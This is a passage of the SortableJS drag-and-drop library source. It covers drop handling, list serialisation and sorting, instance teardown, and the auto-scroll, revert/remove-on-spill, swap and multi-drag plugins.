			/* jshint eqnull:true */
			if (newIndex == null || newIndex === -1) {
			  newIndex = oldIndex;
			  newDraggableIndex = oldDraggableIndex;
			}

			_dispatchEvent({
			  sortable: this,
			  name: 'end',
			  toEl: parentEl,
			  originalEvent: evt
			}); // Save sorting


			this.save();
		  }
		}
	  }

	  this._nulling();
	},
	_nulling: function _nulling() {
	  pluginEvent('nulling', this);
	  rootEl = dragEl = parentEl = ghostEl = nextEl = cloneEl = lastDownEl = cloneHidden = tapEvt = touchEvt = moved = newIndex = newDraggableIndex = oldIndex = oldDraggableIndex = lastTarget = lastDirection = putSortable = activeGroup = Sortable.dragged = Sortable.ghost = Sortable.clone = Sortable.active = null;
	  savedInputChecked.forEach(function (el) {
		el.checked = true;
	  });
	  savedInputChecked.length = lastDx = lastDy = 0;
	},
	handleEvent: function handleEvent(
	/**Event*/
	evt) {
	  switch (evt.type) {
		case 'drop':
		case 'dragend':
		  this._onDrop(evt);

		  break;

		case 'dragenter':
		case 'dragover':
		  if (dragEl) {
			this._onDragOver(evt);

			_globalDragOver(evt);
		  }

		  break;

		case 'selectstart':
		  evt.preventDefault();
		  break;
	  }
	},

	/**
	 * Serializes the item into an array of string.
	 * @returns {String[]}
	 */
	toArray: function toArray() {
	  var order = [],
		  el,
		  children = this.el.children,
		  i = 0,
		  n = children.length,
		  options = this.options;

	  for (; i < n; i++) {
		el = children[i];

		if (closest(el, options.draggable, this.el, false)) {
		  order.push(el.getAttribute(options.dataIdAttr) || _generateId(el));
		}
	  }

	  return order;
	},

	/**
	 * Sorts the elements according to the array.
	 * @param  {String[]}  order  order of the items
	 */
	sort: function sort(order, useAnimation) {
	  var items = {},
		  rootEl = this.el;
	  this.toArray().forEach(function (id, i) {
		var el = rootEl.children[i];

		if (closest(el, this.options.draggable, rootEl, false)) {
		  items[id] = el;
		}
	  }, this);
	  useAnimation && this.captureAnimationState();
	  order.forEach(function (id) {
		if (items[id]) {
		  rootEl.removeChild(items[id]);
		  rootEl.appendChild(items[id]);
		}
	  });
	  useAnimation && this.animateAll();
	},

	/**
	 * Save the current sorting
	 */
	save: function save() {
	  var store = this.options.store;
	  store && store.set && store.set(this);
	},

	/**
	 * For each element in the set, get the first element that matches the selector by testing the element itself and traversing up through its ancestors in the DOM tree.
	 * @param   {HTMLElement}  el
	 * @param   {String}       [selector]  default: `options.draggable`
	 * @returns {HTMLElement|null}
	 */
	closest: function closest$1(el, selector) {
	  return closest(el, selector || this.options.draggable, this.el, false);
	},

	/**
	 * Set/get option
	 * @param   {string} name
	 * @param   {*}      [value]
	 * @returns {*}
	 */
	option: function option(name, value) {
	  var options = this.options;

	  if (value === void 0) {
		return options[name];
	  } else {
		var modifiedValue = PluginManager.modifyOption(this, name, value);

		if (typeof modifiedValue !== 'undefined') {
		  options[name] = modifiedValue;
		} else {
		  options[name] = value;
		}

		if (name === 'group') {
		  _prepareGroup(options);
		}
	  }
	},

	/**
	 * Destroy
	 */
	destroy: function destroy() {
	  pluginEvent('destroy', this);
	  var el = this.el;
	  el[expando] = null;
	  off(el, 'mousedown', this._onTapStart);
	  off(el, 'touchstart', this._onTapStart);
	  off(el, 'pointerdown', this._onTapStart);

	  if (this.nativeDraggable) {
		off(el, 'dragover', this);
		off(el, 'dragenter', this);
	  } // Remove draggable attributes


	  Array.prototype.forEach.call(el.querySelectorAll('[draggable]'), function (el) {
		el.removeAttribute('draggable');
	  });

	  this._onDrop();

	  this._disableDelayedDragEvents();

	  sortables.splice(sortables.indexOf(this.el), 1);
	  this.el = el = null;
	},
	_hideClone: function _hideClone() {
	  if (!cloneHidden) {
		pluginEvent('hideClone', this);
		if (Sortable.eventCanceled) return;
		css(cloneEl, 'display', 'none');

		if (this.options.removeCloneOnHide && cloneEl.parentNode) {
		  cloneEl.parentNode.removeChild(cloneEl);
		}

		cloneHidden = true;
	  }
	},
	_showClone: function _showClone(putSortable) {
	  if (putSortable.lastPutMode !== 'clone') {
		this._hideClone();

		return;
	  }

	  if (cloneHidden) {
		pluginEvent('showClone', this);
		if (Sortable.eventCanceled) return; // show clone at dragEl or original position

		if (dragEl.parentNode == rootEl && !this.options.group.revertClone) {
		  rootEl.insertBefore(cloneEl, dragEl);
		} else if (nextEl) {
		  rootEl.insertBefore(cloneEl, nextEl);
		} else {
		  rootEl.appendChild(cloneEl);
		}

		if (this.options.group.revertClone) {
		  this.animate(dragEl, cloneEl);
		}

		css(cloneEl, 'display', '');
		cloneHidden = false;
	  }
	}
  };

  function _globalDragOver(
  /**Event*/
  evt) {
	if (evt.dataTransfer) {
	  evt.dataTransfer.dropEffect = 'move';
	}

	evt.cancelable && evt.preventDefault();
  }

  function _onMove(fromEl, toEl, dragEl, dragRect, targetEl, targetRect, originalEvent, willInsertAfter) {
	var evt,
		sortable = fromEl[expando],
		onMoveFn = sortable.options.onMove,
		retVal; // Support for new CustomEvent feature

	if (window.CustomEvent && !IE11OrLess && !Edge) {
	  evt = new CustomEvent('move', {
		bubbles: true,
		cancelable: true
	  });
	} else {
	  evt = document.createEvent('Event');
	  evt.initEvent('move', true, true);
	}

	evt.to = toEl;
	evt.from = fromEl;
	evt.dragged = dragEl;
	evt.draggedRect = dragRect;
	evt.related = targetEl || toEl;
	evt.relatedRect = targetRect || getRect(toEl);
	evt.willInsertAfter = willInsertAfter;
	evt.originalEvent = originalEvent;
	fromEl.dispatchEvent(evt);

	if (onMoveFn) {
	  retVal = onMoveFn.call(sortable, evt, originalEvent);
	}

	return retVal;
  }

  function _disableDraggable(el) {
	el.draggable = false;
  }

  function _unsilent() {
	_silent = false;
  }

  function _ghostIsFirst(evt, vertical, sortable) {
	var rect = getRect(getChild(sortable.el, 0, sortable.options, true));
	var spacer = 10;
	return vertical ? evt.clientX < rect.left - spacer || evt.clientY < rect.top && evt.clientX < rect.right : evt.clientY < rect.top - spacer || evt.clientY < rect.bottom && evt.clientX < rect.left;
  }

  function _ghostIsLast(evt, vertical, sortable) {
	var rect = getRect(lastChild(sortable.el, sortable.options.draggable));
	var spacer = 10;
	return vertical ? evt.clientX > rect.right + spacer || evt.clientX <= rect.right && evt.clientY > rect.bottom && evt.clientX >= rect.left : evt.clientX > rect.right && evt.clientY > rect.top || evt.clientX <= rect.right && evt.clientY > rect.bottom + spacer;
  }

  function _getSwapDirection(evt, target, targetRect, vertical, swapThreshold, invertedSwapThreshold, invertSwap, isLastTarget) {
	var mouseOnAxis = vertical ? evt.clientY : evt.clientX,
		targetLength = vertical ? targetRect.height : targetRect.width,
		targetS1 = vertical ? targetRect.top : targetRect.left,
		targetS2 = vertical ? targetRect.bottom : targetRect.right,
		invert = false;

	if (!invertSwap) {
	  // Never invert or create dragEl shadow when target movemenet causes mouse to move past the end of regular swapThreshold
	  if (isLastTarget && targetMoveDistance < targetLength * swapThreshold) {
		// multiplied only by swapThreshold because mouse will already be inside target by (1 - threshold) * targetLength / 2
		// check if past first invert threshold on side opposite of lastDirection
		if (!pastFirstInvertThresh && (lastDirection === 1 ? mouseOnAxis > targetS1 + targetLength * invertedSwapThreshold / 2 : mouseOnAxis < targetS2 - targetLength * invertedSwapThreshold / 2)) {
		  // past first invert threshold, do not restrict inverted threshold to dragEl shadow
		  pastFirstInvertThresh = true;
		}

		if (!pastFirstInvertThresh) {
		  // dragEl shadow (target move distance shadow)
		  if (lastDirection === 1 ? mouseOnAxis < targetS1 + targetMoveDistance // over dragEl shadow
		  : mouseOnAxis > targetS2 - targetMoveDistance) {
			return -lastDirection;
		  }
		} else {
		  invert = true;
		}
	  } else {
		// Regular
		if (mouseOnAxis > targetS1 + targetLength * (1 - swapThreshold) / 2 && mouseOnAxis < targetS2 - targetLength * (1 - swapThreshold) / 2) {
		  return _getInsertDirection(target);
		}
	  }
	}

	invert = invert || invertSwap;

	if (invert) {
	  // Invert of regular
	  if (mouseOnAxis < targetS1 + targetLength * invertedSwapThreshold / 2 || mouseOnAxis > targetS2 - targetLength * invertedSwapThreshold / 2) {
		return mouseOnAxis > targetS1 + targetLength / 2 ? 1 : -1;
	  }
	}

	return 0;
  }
  /**
   * Gets the direction dragEl must be swapped relative to target in order to make it
   * seem that dragEl has been "inserted" into that element's position
   * @param  {HTMLElement} target       The target whose position dragEl is being inserted at
   * @return {Number}                   Direction dragEl must be swapped
   */


  function _getInsertDirection(target) {
	if (index(dragEl) < index(target)) {
	  return 1;
	} else {
	  return -1;
	}
  }
  /**
   * Generate id
   * @param   {HTMLElement} el
   * @returns {String}
   * @private
   */


  function _generateId(el) {
	var str = el.tagName + el.className + el.src + el.href + el.textContent,
		i = str.length,
		sum = 0;

	while (i--) {
	  sum += str.charCodeAt(i);
	}

	return sum.toString(36);
  }

  function _saveInputCheckedState(root) {
	savedInputChecked.length = 0;
	var inputs = root.getElementsByTagName('input');
	var idx = inputs.length;

	while (idx--) {
	  var el = inputs[idx];
	  el.checked && savedInputChecked.push(el);
	}
  }

  function _nextTick(fn) {
	return setTimeout(fn, 0);
  }

  function _cancelNextTick(id) {
	return clearTimeout(id);
  } // Fixed #973:


  if (documentExists) {
	on(document, 'touchmove', function (evt) {
	  if ((Sortable.active || awaitingDragStarted) && evt.cancelable) {
		evt.preventDefault();
	  }
	});
  } // Export utils


  Sortable.utils = {
	on: on,
	off: off,
	css: css,
	find: find,
	is: function is(el, selector) {
	  return !!closest(el, selector, el, false);
	},
	extend: extend,
	throttle: throttle,
	closest: closest,
	toggleClass: toggleClass,
	clone: clone,
	index: index,
	nextTick: _nextTick,
	cancelNextTick: _cancelNextTick,
	detectDirection: _detectDirection,
	getChild: getChild
  };
  /**
   * Get the Sortable instance of an element
   * @param  {HTMLElement} element The element
   * @return {Sortable|undefined}         The instance of Sortable
   */

  Sortable.get = function (element) {
	return element[expando];
  };
  /**
   * Mount a plugin to Sortable
   * @param  {...SortablePlugin|SortablePlugin[]} plugins       Plugins being mounted
   */


  Sortable.mount = function () {
	for (var _len = arguments.length, plugins = new Array(_len), _key = 0; _key < _len; _key++) {
	  plugins[_key] = arguments[_key];
	}

	if (plugins[0].constructor === Array) plugins = plugins[0];
	plugins.forEach(function (plugin) {
	  if (!plugin.prototype || !plugin.prototype.constructor) {
		throw "Sortable: Mounted plugin must be a constructor function, not ".concat({}.toString.call(plugin));
	  }

	  if (plugin.utils) Sortable.utils = _objectSpread2(_objectSpread2({}, Sortable.utils), plugin.utils);
	  PluginManager.mount(plugin);
	});
  };
  /**
   * Create sortable instance
   * @param {HTMLElement}  el
   * @param {Object}      [options]
   */


  Sortable.create = function (el, options) {
	return new Sortable(el, options);
  }; // Export


  Sortable.version = version;

  var autoScrolls = [],
	  scrollEl,
	  scrollRootEl,
	  scrolling = false,
	  lastAutoScrollX,
	  lastAutoScrollY,
	  touchEvt$1,
	  pointerElemChangedInterval;

  function AutoScrollPlugin() {
	function AutoScroll() {
	  this.defaults = {
		scroll: true,
		forceAutoScrollFallback: false,
		scrollSensitivity: 30,
		scrollSpeed: 10,
		bubbleScroll: true
	  }; // Bind all private methods

	  for (var fn in this) {
		if (fn.charAt(0) === '_' && typeof this[fn] === 'function') {
		  this[fn] = this[fn].bind(this);
		}
	  }
	}

	AutoScroll.prototype = {
	  dragStarted: function dragStarted(_ref) {
		var originalEvent = _ref.originalEvent;

		if (this.sortable.nativeDraggable) {
		  on(document, 'dragover', this._handleAutoScroll);
		} else {
		  if (this.options.supportPointer) {
			on(document, 'pointermove', this._handleFallbackAutoScroll);
		  } else if (originalEvent.touches) {
			on(document, 'touchmove', this._handleFallbackAutoScroll);
		  } else {
			on(document, 'mousemove', this._handleFallbackAutoScroll);
		  }
		}
	  },
	  dragOverCompleted: function dragOverCompleted(_ref2) {
		var originalEvent = _ref2.originalEvent;

		// For when bubbling is canceled and using fallback (fallback 'touchmove' always reached)
		if (!this.options.dragOverBubble && !originalEvent.rootEl) {
		  this._handleAutoScroll(originalEvent);
		}
	  },
	  drop: function drop() {
		if (this.sortable.nativeDraggable) {
		  off(document, 'dragover', this._handleAutoScroll);
		} else {
		  off(document, 'pointermove', this._handleFallbackAutoScroll);
		  off(document, 'touchmove', this._handleFallbackAutoScroll);
		  off(document, 'mousemove', this._handleFallbackAutoScroll);
		}

		clearPointerElemChangedInterval();
		clearAutoScrolls();
		cancelThrottle();
	  },
	  nulling: function nulling() {
		touchEvt$1 = scrollRootEl = scrollEl = scrolling = pointerElemChangedInterval = lastAutoScrollX = lastAutoScrollY = null;
		autoScrolls.length = 0;
	  },
	  _handleFallbackAutoScroll: function _handleFallbackAutoScroll(evt) {
		this._handleAutoScroll(evt, true);
	  },
	  _handleAutoScroll: function _handleAutoScroll(evt, fallback) {
		var _this = this;

		var x = (evt.touches ? evt.touches[0] : evt).clientX,
			y = (evt.touches ? evt.touches[0] : evt).clientY,
			elem = document.elementFromPoint(x, y);
		touchEvt$1 = evt; // IE does not seem to have native autoscroll,
		// Edge's autoscroll seems too conditional,
		// MACOS Safari does not have autoscroll,
		// Firefox and Chrome are good

		if (fallback || this.options.forceAutoScrollFallback || Edge || IE11OrLess || Safari) {
		  autoScroll(evt, this.options, elem, fallback); // Listener for pointer element change

		  var ogElemScroller = getParentAutoScrollElement(elem, true);

		  if (scrolling && (!pointerElemChangedInterval || x !== lastAutoScrollX || y !== lastAutoScrollY)) {
			pointerElemChangedInterval && clearPointerElemChangedInterval(); // Detect for pointer elem change, emulating native DnD behaviour

			pointerElemChangedInterval = setInterval(function () {
			  var newElem = getParentAutoScrollElement(document.elementFromPoint(x, y), true);

			  if (newElem !== ogElemScroller) {
				ogElemScroller = newElem;
				clearAutoScrolls();
			  }

			  autoScroll(evt, _this.options, newElem, fallback);
			}, 10);
			lastAutoScrollX = x;
			lastAutoScrollY = y;
		  }
		} else {
		  // if DnD is enabled (and browser has good autoscrolling), first autoscroll will already scroll, so get parent autoscroll of first autoscroll
		  if (!this.options.bubbleScroll || getParentAutoScrollElement(elem, true) === getWindowScrollingElement()) {
			clearAutoScrolls();
			return;
		  }

		  autoScroll(evt, this.options, getParentAutoScrollElement(elem, false), false);
		}
	  }
	};
	return _extends(AutoScroll, {
	  pluginName: 'scroll',
	  initializeByDefault: true
	});
  }

  function clearAutoScrolls() {
	autoScrolls.forEach(function (autoScroll) {
	  clearInterval(autoScroll.pid);
	});
	autoScrolls = [];
  }

  function clearPointerElemChangedInterval() {
	clearInterval(pointerElemChangedInterval);
  }

  var autoScroll = throttle(function (evt, options, rootEl, isFallback) {
	// Bug: https://bugzilla.mozilla.org/show_bug.cgi?id=505521
	if (!options.scroll) return;
	var x = (evt.touches ? evt.touches[0] : evt).clientX,
		y = (evt.touches ? evt.touches[0] : evt).clientY,
		sens = options.scrollSensitivity,
		speed = options.scrollSpeed,
		winScroller = getWindowScrollingElement();
	var scrollThisInstance = false,
		scrollCustomFn; // New scroll root, set scrollEl

	if (scrollRootEl !== rootEl) {
	  scrollRootEl = rootEl;
	  clearAutoScrolls();
	  scrollEl = options.scroll;
	  scrollCustomFn = options.scrollFn;

	  if (scrollEl === true) {
		scrollEl = getParentAutoScrollElement(rootEl, true);
	  }
	}

	var layersOut = 0;
	var currentParent = scrollEl;

	do {
	  var el = currentParent,
		  rect = getRect(el),
		  top = rect.top,
		  bottom = rect.bottom,
		  left = rect.left,
		  right = rect.right,
		  width = rect.width,
		  height = rect.height,
		  canScrollX = void 0,
		  canScrollY = void 0,
		  scrollWidth = el.scrollWidth,
		  scrollHeight = el.scrollHeight,
		  elCSS = css(el),
		  scrollPosX = el.scrollLeft,
		  scrollPosY = el.scrollTop;

	  if (el === winScroller) {
		canScrollX = width < scrollWidth && (elCSS.overflowX === 'auto' || elCSS.overflowX === 'scroll' || elCSS.overflowX === 'visible');
		canScrollY = height < scrollHeight && (elCSS.overflowY === 'auto' || elCSS.overflowY === 'scroll' || elCSS.overflowY === 'visible');
	  } else {
		canScrollX = width < scrollWidth && (elCSS.overflowX === 'auto' || elCSS.overflowX === 'scroll');
		canScrollY = height < scrollHeight && (elCSS.overflowY === 'auto' || elCSS.overflowY === 'scroll');
	  }

	  var vx = canScrollX && (Math.abs(right - x) <= sens && scrollPosX + width < scrollWidth) - (Math.abs(left - x) <= sens && !!scrollPosX);
	  var vy = canScrollY && (Math.abs(bottom - y) <= sens && scrollPosY + height < scrollHeight) - (Math.abs(top - y) <= sens && !!scrollPosY);

	  if (!autoScrolls[layersOut]) {
		for (var i = 0; i <= layersOut; i++) {
		  if (!autoScrolls[i]) {
			autoScrolls[i] = {};
		  }
		}
	  }

	  if (autoScrolls[layersOut].vx != vx || autoScrolls[layersOut].vy != vy || autoScrolls[layersOut].el !== el) {
		autoScrolls[layersOut].el = el;
		autoScrolls[layersOut].vx = vx;
		autoScrolls[layersOut].vy = vy;
		clearInterval(autoScrolls[layersOut].pid);

		if (vx != 0 || vy != 0) {
		  scrollThisInstance = true;
		  /* jshint loopfunc:true */

		  autoScrolls[layersOut].pid = setInterval(function () {
			// emulate drag over during autoscroll (fallback), emulating native DnD behaviour
			if (isFallback && this.layer === 0) {
			  Sortable.active._onTouchMove(touchEvt$1); // To move ghost if it is positioned absolutely

			}

			var scrollOffsetY = autoScrolls[this.layer].vy ? autoScrolls[this.layer].vy * speed : 0;
			var scrollOffsetX = autoScrolls[this.layer].vx ? autoScrolls[this.layer].vx * speed : 0;

			if (typeof scrollCustomFn === 'function') {
			  if (scrollCustomFn.call(Sortable.dragged.parentNode[expando], scrollOffsetX, scrollOffsetY, evt, touchEvt$1, autoScrolls[this.layer].el) !== 'continue') {
				return;
			  }
			}

			scrollBy(autoScrolls[this.layer].el, scrollOffsetX, scrollOffsetY);
		  }.bind({
			layer: layersOut
		  }), 24);
		}
	  }

	  layersOut++;
	} while (options.bubbleScroll && currentParent !== winScroller && (currentParent = getParentAutoScrollElement(currentParent, false)));

	scrolling = scrollThisInstance; // in case another function catches scrolling as false in between when it is not
  }, 30);

  var drop = function drop(_ref) {
	var originalEvent = _ref.originalEvent,
		putSortable = _ref.putSortable,
		dragEl = _ref.dragEl,
		activeSortable = _ref.activeSortable,
		dispatchSortableEvent = _ref.dispatchSortableEvent,
		hideGhostForTarget = _ref.hideGhostForTarget,
		unhideGhostForTarget = _ref.unhideGhostForTarget;
	if (!originalEvent) return;
	var toSortable = putSortable || activeSortable;
	hideGhostForTarget();
	var touch = originalEvent.changedTouches && originalEvent.changedTouches.length ? originalEvent.changedTouches[0] : originalEvent;
	var target = document.elementFromPoint(touch.clientX, touch.clientY);
	unhideGhostForTarget();

	if (toSortable && !toSortable.el.contains(target)) {
	  dispatchSortableEvent('spill');
	  this.onSpill({
		dragEl: dragEl,
		putSortable: putSortable
	  });
	}
  };

  function Revert() {}

  Revert.prototype = {
	startIndex: null,
	dragStart: function dragStart(_ref2) {
	  var oldDraggableIndex = _ref2.oldDraggableIndex;
	  this.startIndex = oldDraggableIndex;
	},
	onSpill: function onSpill(_ref3) {
	  var dragEl = _ref3.dragEl,
		  putSortable = _ref3.putSortable;
	  this.sortable.captureAnimationState();

	  if (putSortable) {
		putSortable.captureAnimationState();
	  }

	  var nextSibling = getChild(this.sortable.el, this.startIndex, this.options);

	  if (nextSibling) {
		this.sortable.el.insertBefore(dragEl, nextSibling);
	  } else {
		this.sortable.el.appendChild(dragEl);
	  }

	  this.sortable.animateAll();

	  if (putSortable) {
		putSortable.animateAll();
	  }
	},
	drop: drop
  };

  _extends(Revert, {
	pluginName: 'revertOnSpill'
  });

  function Remove() {}

  Remove.prototype = {
	onSpill: function onSpill(_ref4) {
	  var dragEl = _ref4.dragEl,
		  putSortable = _ref4.putSortable;
	  var parentSortable = putSortable || this.sortable;
	  parentSortable.captureAnimationState();
	  dragEl.parentNode && dragEl.parentNode.removeChild(dragEl);
	  parentSortable.animateAll();
	},
	drop: drop
  };

  _extends(Remove, {
	pluginName: 'removeOnSpill'
  });

  var lastSwapEl;

  function SwapPlugin() {
	function Swap() {
	  this.defaults = {
		swapClass: 'sortable-swap-highlight'
	  };
	}

	Swap.prototype = {
	  dragStart: function dragStart(_ref) {
		var dragEl = _ref.dragEl;
		lastSwapEl = dragEl;
	  },
	  dragOverValid: function dragOverValid(_ref2) {
		var completed = _ref2.completed,
			target = _ref2.target,
			onMove = _ref2.onMove,
			activeSortable = _ref2.activeSortable,
			changed = _ref2.changed,
			cancel = _ref2.cancel;
		if (!activeSortable.options.swap) return;
		var el = this.sortable.el,
			options = this.options;

		if (target && target !== el) {
		  var prevSwapEl = lastSwapEl;

		  if (onMove(target) !== false) {
			toggleClass(target, options.swapClass, true);
			lastSwapEl = target;
		  } else {
			lastSwapEl = null;
		  }

		  if (prevSwapEl && prevSwapEl !== lastSwapEl) {
			toggleClass(prevSwapEl, options.swapClass, false);
		  }
		}

		changed();
		completed(true);
		cancel();
	  },
	  drop: function drop(_ref3) {
		var activeSortable = _ref3.activeSortable,
			putSortable = _ref3.putSortable,
			dragEl = _ref3.dragEl;
		var toSortable = putSortable || this.sortable;
		var options = this.options;
		lastSwapEl && toggleClass(lastSwapEl, options.swapClass, false);

		if (lastSwapEl && (options.swap || putSortable && putSortable.options.swap)) {
		  if (dragEl !== lastSwapEl) {
			toSortable.captureAnimationState();
			if (toSortable !== activeSortable) activeSortable.captureAnimationState();
			swapNodes(dragEl, lastSwapEl);
			toSortable.animateAll();
			if (toSortable !== activeSortable) activeSortable.animateAll();
		  }
		}
	  },
	  nulling: function nulling() {
		lastSwapEl = null;
	  }
	};
	return _extends(Swap, {
	  pluginName: 'swap',
	  eventProperties: function eventProperties() {
		return {
		  swapItem: lastSwapEl
		};
	  }
	});
  }

  function swapNodes(n1, n2) {
	var p1 = n1.parentNode,
		p2 = n2.parentNode,
		i1,
		i2;
	if (!p1 || !p2 || p1.isEqualNode(n2) || p2.isEqualNode(n1)) return;
	i1 = index(n1);
	i2 = index(n2);

	if (p1.isEqualNode(p2) && i1 < i2) {
	  i2++;
	}

	p1.insertBefore(n2, p1.children[i1]);
	p2.insertBefore(n1, p2.children[i2]);
  }

  var multiDragElements = [],
	  multiDragClones = [],
	  lastMultiDragSelect,
	  // for selection with modifier key down (SHIFT)
  multiDragSortable,
	  initialFolding = false,
	  // Initial multi-drag fold when drag started
  folding = false,
	  // Folding any other time
  dragStarted = false,
	  dragEl$1,
	  clonesFromRect,
	  clonesHidden;

  function MultiDragPlugin() {
	function MultiDrag(sortable) {
	  // Bind all private methods
	  for (var fn in this) {
		if (fn.charAt(0) === '_' && typeof this[fn] === 'function') {
		  this[fn] = this[fn].bind(this);
		}
	  }

	  if (sortable.options.supportPointer) {
		on(document, 'pointerup', this._deselectMultiDrag);
	  } else {
		on(document, 'mouseup', this._deselectMultiDrag);
		on(document, 'touchend', this._deselectMultiDrag);
	  }

	  on(document, 'keydown', this._checkKeyDown);
	  on(document, 'keyup', this._checkKeyUp);
	  this.defaults = {
		selectedClass: 'sortable-selected',
		multiDragKey: null,
		setData: function setData(dataTransfer, dragEl) {
		  var data = '';

		  if (multiDragElements.length && multiDragSortable === sortable) {
			multiDragElements.forEach(function (multiDragElement, i) {
			  data += (!i ? '' : ', ') + multiDragElement.textContent;
			});
		  } else {
			data = dragEl.textContent;
		  }

		  dataTransfer.setData('Text', data);
		}
	  };
	}

	MultiDrag.prototype = {
	  multiDragKeyDown: false,
	  isMultiDrag: false,
	  delayStartGlobal: function delayStartGlobal(_ref) {
		var dragged = _ref.dragEl;
		dragEl$1 = dragged;
	  },
	  delayEnded: function delayEnded() {
		this.isMultiDrag = ~multiDragElements.indexOf(dragEl$1);
	  },
	  setupClone: function setupClone(_ref2) {
		var sortable = _ref2.sortable,
			cancel = _ref2.cancel;
		if (!this.isMultiDrag) return;

		for (var i = 0; i < multiDragElements.length; i++) {
		  multiDragClones.push(clone(multiDragElements[i]));
		  multiDragClones[i].sortableIndex = multiDragElements[i].sortableIndex;
		  multiDragClones[i].draggable = false;
		  multiDragClones[i].style['will-change'] = '';
		  toggleClass(multiDragClones[i], this.options.selectedClass, false);
		  multiDragElements[i] === dragEl$1 && toggleClass(multiDragClones[i], this.options.chosenClass, false);
		}

		sortable._hideClone();

		cancel();
	  },
	  clone: function clone(_ref3) {
		var sortable = _ref3.sortable,
			rootEl = _ref3.rootEl,
			dispatchSortableEvent = _ref3.dispatchSortableEvent,
			cancel = _ref3.cancel;
		if (!this.isMultiDrag) return;

		if (!this.options.removeCloneOnHide) {
		  if (multiDragElements.length && multiDragSortable === sortable) {
			insertMultiDragClones(true, rootEl);
			dispatchSortableEvent('clone');
			cancel();
		  }
		}
	  },
	  showClone: function showClone(_ref4) {
		var cloneNowShown = _ref4.cloneNowShown,
			rootEl = _ref4.rootEl,
			cancel = _ref4.cancel;
		if (!this.isMultiDrag) return;
		insertMultiDragClones(false, rootEl);
		multiDragClones.forEach(function (clone) {
		  css(clone, 'display', '');
		});
		cloneNowShown();
		clonesHidden = false;
		cancel();
	  },
	  hideClone: function hideClone(_ref5) {
		var _this = this;

		var sortable = _ref5.sortable,
			cloneNowHidden = _ref5.cloneNowHidden,
			cancel = _ref5.cancel;
		if (!this.isMultiDrag) return;
		multiDragClones.forEach(function (clone) {
		  css(clone, 'display', 'none');

		  if (_this.options.removeCloneOnHide && clone.parentNode) {
			clone.parentNode.removeChild(clone);
		  }
		});
		cloneNowHidden();
		clonesHidden = true;
		cancel();
	  },
	  dragStartGlobal: function dragStartGlobal(_ref6) {
		var sortable = _ref6.sortable;

		if (!this.isMultiDrag && multiDragSortable) {
		  multiDragSortable.multiDrag._deselectMultiDrag();
		}

		multiDragElements.forEach(function (multiDragElement) {
		  multiDragElement.sortableIndex = index(multiDragElement);
		}); // Sort multi-drag elements

		multiDragElements = multiDragElements.sort(function (a, b) {
		  return a.sortableIndex - b.sortableIndex;
		});
		dragStarted = true;
	  },
	  dragStarted: function dragStarted(_ref7) {
		var _this2 = this;

		var sortable = _ref7.sortable;
		if (!this.isMultiDrag) return;

		if (this.options.sort) {
		  // Capture rects,
		  // hide multi drag elements (by positioning them absolute),
		  // set multi drag elements rects to dragRect,
		  // show multi drag elements,
		  // animate to rects,
		  // unset rects & remove from DOM
		  sortable.captureAnimationState();

		  if (this.options.animation) {
			multiDragElements.forEach(function (multiDragElement) {
			  if (multiDragElement === dragEl$1) return;
			  css(multiDragElement, 'position', 'absolute');
			});
			var dragRect = getRect(dragEl$1, false, true, true);
			multiDragElements.forEach(function (multiDragElement) {
			  if (multiDragElement === dragEl$1) return;
			  setRect(multiDragElement, dragRect);
			});
			folding = true;
			initialFolding = true;
		  }
		}

		sortable.animateAll(function () {
		  folding = false;
		  initialFolding = false;

		  if (_this2.options.animation) {
			multiDragElements.forEach(function (multiDragElement) {
			  unsetRect(multiDragElement);
			});
		  } // Remove all auxiliary multidrag items from el, if sorting enabled


		  if (_this2.options.sort) {
			removeMultiDragElements();
		  }
		});
	  },
	  dragOver: function dragOver(_ref8) {
		var target = _ref8.target,
			completed = _ref8.completed,
			cancel = _ref8.cancel;

		if (folding && ~multiDragElements.indexOf(target)) {
		  completed(false);
		  cancel();
		}
	  },
	  revert: function revert(_ref9) {
		var fromSortable = _ref9.fromSortable,
			rootEl = _ref9.rootEl,
			sortable = _ref9.sortable,
			dragRect = _ref9.dragRect;

		if (multiDragElements.length > 1) {
		  // Setup unfold animation
		  multiDragElements.forEach(function (multiDragElement) {
			sortable.addAnimationState({
			  target: multiDragElement,
			  rect: folding ? getRect(multiDragElement) : dragRect
			});
			unsetRect(multiDragElement);
			multiDragElement.fromRect = dragRect;
			fromSortable.removeAnimationState(multiDragElement);
		  });
		  folding = false;
		  insertMultiDragElements(!this.options.removeCloneOnHide, rootEl);
		}
	  },
	  dragOverCompleted: function dragOverCompleted(_ref10) {
		var sortable = _ref10.sortable,
			isOwner = _ref10.isOwner,
			insertion = _ref10.insertion,
			activeSortable = _ref10.activeSortable,
			parentEl = _ref10.parentEl,
			putSortable = _ref10.putSortable;
		var options = this.options;

		if (insertion) {
		  // Clones must be hidden before folding animation to capture dragRectAbsolute properly
		  if (isOwner) {
			activeSortable._hideClone();
		  }

		  initialFolding = false; // If leaving sort:false root, or already folding - Fold to new location

		  if (options.animation && multiDragElements.length > 1 && (folding || !isOwner && !activeSortable.options.sort && !putSortable)) {
			// Fold: Set all multi drag elements's rects to dragEl's rect when multi-drag elements are invisible
			var dragRectAbsolute = getRect(dragEl$1, false, true, true);
			multiDragElements.forEach(function (multiDragElement) {
			  if (multiDragElement === dragEl$1) return;
			  setRect(multiDragElement, dragRectAbsolute); // Move element(s) to end of parentEl so that it does not interfere with multi-drag clones insertion if they are inserted
			  // while folding, and so that we can capture them again because old sortable will no longer be fromSortable

			  parentEl.appendChild(multiDragElement);
			});
			folding = true;
		  } // Clones must be shown (and check to remove multi drags) after folding when interfering multiDragElements are moved out


		  if (!isOwner) {
			// Only remove if not folding (folding will remove them anyways)
			if (!folding) {
			  removeMultiDragElements();
			}

			if (multiDragElements.length > 1) {
			  var clonesHiddenBefore = clonesHidden;

			  activeSortable._showClone(sortable); // Unfold animation for clones if showing from hidden


			  if (activeSortable.options.animation && !clonesHidden && clonesHiddenBefore) {
				multiDragClones.forEach(function (clone) {
				  activeSortable.addAnimationState({
					target: clone,
					rect: clonesFromRect
				  });
				  clone.fromRect = clonesFromRect;
				  clone.thisAnimationDuration = null;
				});
			  }
			} else {
			  activeSortable._showClone(sortable);
			}
		  }
		}
	  },
	  dragOverAnimationCapture: function dragOverAnimationCapture(_ref11) {
		var dragRect = _ref11.dragRect,
			isOwner = _ref11.isOwner,
			activeSortable = _ref11.activeSortable;
		multiDragElements.forEach(function (multiDragElement) {
		  multiDragElement.thisAnimationDuration = null;
		});

		if (activeSortable.options.animation && !isOwner && activeSortable.multiDrag.isMultiDrag) {
		  clonesFromRect = _extends({}, dragRect);
